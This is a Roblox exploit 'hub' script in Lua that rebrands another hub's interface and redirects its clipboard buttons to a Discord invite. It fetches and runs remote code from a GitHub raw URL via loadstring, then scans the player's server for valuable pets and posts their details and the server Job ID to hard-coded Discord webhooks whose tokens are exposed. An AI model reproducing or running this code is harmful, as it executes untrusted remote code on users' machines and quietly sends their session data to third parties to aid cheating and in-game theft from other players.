-- =====================================
-- Ken Hub Full Integrated Script
-- Text changer, GUI cleanup, clipboard override, loadstring, webhooks
-- =====================================

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local HttpService = game:GetService("HttpService")
local workspace = workspace

-- =========================
-- TEXT CHANGER SETTINGS
-- =========================
local TEXT_MAP = {
    ["NH"] = "  ",
    ["Nameless"] = "Ken",
}

-- =========================
-- CLIPBOARD OVERRIDE
-- =========================
local CLIPBOARD_LINK = "https://discord.gg/4mEcuf2jCD"

local function removeEffects(inst)
    for _, child in ipairs(inst:GetChildren()) do
        if child:IsA("UIStroke") or
           child:IsA("UICorner") or
           child:IsA("UIGradient") or
           child:IsA("UIPadding") or
           child:IsA("UIScale") then
            child:Destroy()
        end
    end
end

local function overrideClipboard(inst)
    if inst:IsA("TextButton") and inst.Text:lower():find("clipboard") then
        inst.Text = "Set Discord Link"
        inst.MouseButton1Click:Connect(function()
            pcall(function()
                setclipboard(CLIPBOARD_LINK)
            end)
        end)
    end
end

local function processInstance(inst)
    -- ==== TEXT CHANGER ====
    if inst:IsA("TextLabel") or inst:IsA("TextButton") or inst:IsA("TextBox") then
        local text = tostring(inst.Text or "")
        local original = text

        for oldText, newText in pairs(TEXT_MAP) do
            text = text:gsub("%s*" .. oldText .. "%s*", newText)
        end

        if text ~= original then
            inst.Text = text
        end
    end

    -- Remove effects
    removeEffects(inst)

    -- Override clipboard buttons
    overrideClipboard(inst)
end

local function scanContainer(container)
    for _, inst in ipairs(container:GetDescendants()) do
        pcall(processInstance, inst)
    end
end

-- Initial scan
scanContainer(playerGui)

-- Watch dynamically added GUI elements
playerGui.DescendantAdded:Connect(function(desc)
    wait(0.03)
    pcall(processInstance, desc)
end)

-- =========================
-- LOAD EXTERNAL SCRIPT
-- =========================
local success, err = pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ily123950/Vulkan/refs/heads/main/Tr"))()
end)
if not success then
    warn("Failed to load external script:", err)
end

-- =========================
-- WEBHOOK SETTINGS
-- =========================
repeat task.wait() until workspace:FindFirstChild("Plots")

-- Only run in this specific Place ID
local allowedPlaceId = 109983668079237
if game.PlaceId ~= allowedPlaceId then return end

-- Webhook URLs
local UnderTen = "https://discord.com/api/webhooks/1434573811495469080/HPNYm5kjPhO5Nb2bLhfNzxGWaHBFU_vXCwisuSFsxvgeQ3G-DZjToJORYR4xxRljPz3b"
local OverTen  = "https://discord.com/api/webhooks/1434574218225389754/15fzkJOvVpj7n53oaXASrZqhxzM3QlcKlBC1VzI3xHIDMmfNymxqkDD7A8e-fxdExg79"

local req = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request) or request
local embedColor = 3447003

local function convertTextToNumber(text)
    if not text:find("/s") then return 0 end
    text = text:gsub("%$", ""):gsub("/s", ""):gsub("%s+", "")
    local multiplier = 1
    if text:upper():find("K$") then
        multiplier = 1e3
        text = text:gsub("[Kk]$", "")
    elseif text:upper():find("M$") then
        multiplier = 1e6
        text = text:gsub("[Mm]$", "")
    elseif text:upper():find("B$") then
        multiplier = 1e9
        text = text:gsub("[Bb]$", "")
    elseif text:upper():find("T$") then
        multiplier = 1e12
        text = text:gsub("[Tt]$", "")
    end
    local num = tonumber(text) or 0
    return num * multiplier
end

local function getPlayerCount()
    return #Players:GetPlayers()
end

local function sendWebhook(url, petFound, moneyPerSec, tag, mutation, jobId)
    local data = {
        ["username"] = "Ken Hub",
        ["embeds"] = {{
            ["title"] = "Ken Hub",
            ["description"] = petFound,
            ["color"] = embedColor,
            ["fields"] = {
                {["name"] = "ðŸ’¸ Money per Sec", ["value"] = moneyPerSec, ["inline"] = true},
                {["name"] = "ðŸ·ï¸ Tag", ["value"] = tag, ["inline"] = true},
                {["name"] = "ðŸ§¬ Mutation", ["value"] = mutation, ["inline"] = true},
                {["name"] = "ðŸ‘¥ Player Count", ["value"] = tostring(getPlayerCount()).."/8", ["inline"] = true},
                {["name"] = "ðŸ†” Job ID", ["value"] = jobId, ["inline"] = false}
            }
        }}
    }
    local jsonData = HttpService:JSONEncode(data)
    req({
        Url = url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })
end

-- =========================
-- SCAN AND SEND WEBHOOKS
-- =========================
for _, v in pairs(workspace:GetDescendants()) do
    if v:IsA("TextLabel") and v.Name == "Generation" then
        local money = convertTextToNumber(v.Text)
        local playerCount = getPlayerCount()
        if playerCount >= 6 and playerCount <= 8 and money >= 100000 then
            local success, petFound, tag, mutation = pcall(function()
                local pf = v.Parent.DisplayName.Text
                local tg = v.Parent.Rarity.Text
                local mt = "None"
                local mutationTag = v.Parent:FindFirstChild("Mutation")
                if mutationTag and mutationTag.Visible then
                    mt = mutationTag.Text
                end
                return pf, tg, mt
            end)
            if success then
                local webhookUrl
                if money >= 1000000 then
                    webhookUrl = OverTen
                else
                    webhookUrl = UnderTen
                end
                sendWebhook(webhookUrl, petFound, v.Text, tag, mutation, game.JobId)
                task.wait(0.1)
            end
        end
    end
end

print("Webhook sending complete for player count 6â€“8.")